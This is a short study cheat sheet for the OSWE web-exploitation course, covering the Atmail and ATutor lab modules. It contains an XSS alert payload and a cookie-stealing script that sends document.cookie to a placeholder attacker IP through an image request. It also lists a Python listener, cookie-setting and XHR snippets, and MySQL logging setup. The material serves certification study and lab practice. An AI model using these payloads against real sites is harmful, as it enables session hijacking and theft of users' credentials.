# OSWE-cheat-sheet
OSWE-cheat sheet module by module with updated syllabus:

Module : Atmail :

1. Access and alert cookie payload (Httponly flag should be disable in set-Cookie headers)<br>
    #<script>alert(document.cookie);</script>
    
2. Run Python Server in python3<br>
    #python3 -m http.server
    
3. Embeded cookie steal payload in image tag<br>
    #function addImage() {<br>
    #var img = document.createElement('img');<br>
    #img.src = 'http://AttackerIP:port/' + document.cookie;<br>
    #document.body.appendChild(img);<br>
    #}<br>
    #addImage();<br>
    
4. Set cookie by web developer console<br>
    #javascript:void(document.cookie="cookiename=value");
 
5. XHR POST Request <br>
    #xhr= new XMLHttpRequest()<br>
    #xhr.open("POST", url, true)<br>
    #xhr.send(data)<br>
    
6. XHR GET Request <br>
    #xhr= new XMLHttpRequest()<br>
    #xhr.open("GET", url, true)<br>
    #xhr.send()<br>

 Module : ATutor Authentication Bypass and RCE :<br>
 1. Enable MySQL DB logging<br>
    #nano /etc/mysql/my.cnf /*** uncomment or add below line /<br>
        #[mysqld]<br>
        #general_log_file = /var/log/mysql/mysql.log<br>
        #general_log = 1<br>
    #systemctl restart mysql / Restart MySQL /<br>
    #tail –f /var/log/mysql/mysql.log   /***Access MySQL Log ***/<br>
    
